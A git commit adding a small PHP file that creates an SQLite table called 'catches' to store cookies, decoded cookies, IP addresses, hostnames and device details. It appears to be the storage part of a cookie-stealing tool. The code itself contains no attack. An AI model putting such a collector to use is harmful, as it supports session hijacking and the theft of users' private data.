0563f3b1fb09690961cb7df6fbb23fb0b05c1283
4xx404 <45526353+4xx404@users.noreply.github.com>
2021-03-07 21:00:57 +0000

    SQLite3 Storage
    Write output to SQLite3 Database

---
+++ db/db.php
@@ -0,0 +1,4 @@
+<?php
+	$db = new SQLite3('db/test.db');
+	$db->exec("CREATE TABLE IF NOT EXISTS catches(id INTEGER PRIMARY KEY AUTOINCREMENT, cookie TEXT, decoded_cookie TEXT, ip_address TEXT, hostname TEXT, device_details TEXT, catch_date TIMESTAMP)");
+?>
